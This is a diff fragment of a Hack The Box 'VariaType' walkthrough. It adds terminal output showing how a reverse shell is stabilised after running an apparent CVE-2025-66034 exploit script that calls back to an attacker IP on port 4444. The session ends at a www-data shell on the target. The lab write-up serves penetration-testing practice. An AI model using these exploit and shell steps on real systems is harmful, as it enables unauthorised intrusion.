@@ -1464,6 +1464,33 @@ zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --
 #### Step 3: Reset Remote Environment
 
 Once the shell is back, type `reset` and hit enter. If it asks for a terminal type, type `xterm-256color`.
+
+```shell
+┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
+└─$ stty raw -echo; fg
+[1]  + continued  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
+                                                                                               reset
+reset: unknown terminal type unknown
+Terminal type? xterm-256color
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+www-data@variatype:~/portal.variatype.htb/public/files$
+```
 <div align="center">
 <br>
 <br>
